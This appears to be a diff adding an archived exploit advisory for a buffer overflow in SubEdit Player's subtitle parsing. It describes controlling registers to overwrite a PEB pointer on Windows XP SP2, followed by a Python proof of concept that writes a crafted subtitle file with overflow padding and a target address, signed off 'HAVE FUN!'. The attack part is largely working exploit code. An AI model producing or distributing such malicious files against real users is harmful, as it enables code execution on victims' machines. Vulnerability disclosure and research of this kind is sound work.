@@ -1,0 +1,51 @@
+/===Subedit Player build 4066 subtitle BoF vulnerability=========|
+|
+| SubEdit Player is a very popular player and subtitles    
+| editor in Poland. It does not perform any boundery checks         
+| on supplied subtitles. This causes buffer overrun and
+| throwing access violation exception on group of instructions:
+|
+|
+| 005F7C1E  |. 8902           MOV DWORD PTR DS:[EDX],EAX
+| 005F7C20  |. 8950 04        MOV DWORD PTR DS:[EAX+4],EDX
+|    
+| I thought in first moment that this is heap overflow, but
+| why does these instructions appear in subedit module? And
+| why on my winxp sp2 computer this is possible? So, I think
+| that this program has own kind of dynamically list structure
+| and I am able to overwrite its pointers.
+|
+| Ok so, I am controling EAX and EDX registers. In this
+| situation I am able to use technique described by c0ntex
+| ( thx mate! ) to overwrite a pointer to RtlEnterCriticalSection
+| in PEB structure of ntdll. Thanks to this (after about 30
+| access violations when writing - exceptions handlers throw
+| exceptions handlers)
+| I get:
+|
+|   
+|  {Access violation when executing [42424242]}
+|                                 
+|  -Tested on Windows Xp sp2 fully patched.
+|  -Greatz to: mewo
+|
+|  -Bug discovered by grzdyl         
+|
+\=================================================================|
+       
+POC:
+
+#!/usr/bin/python
+
+sub = "{4143}{4200}"
+sub += "B" * 4098
+sub += "\x20\xf0\xfd\x7f"
+sub += "A" * 398
+
+fd = open("thematrix.txt", "w")
+fd.write(sub)
+fd.close()
+
+print "FILE CREATED\nHAVE FUN!"
+
+# milw0rm.com [2008-04-19]
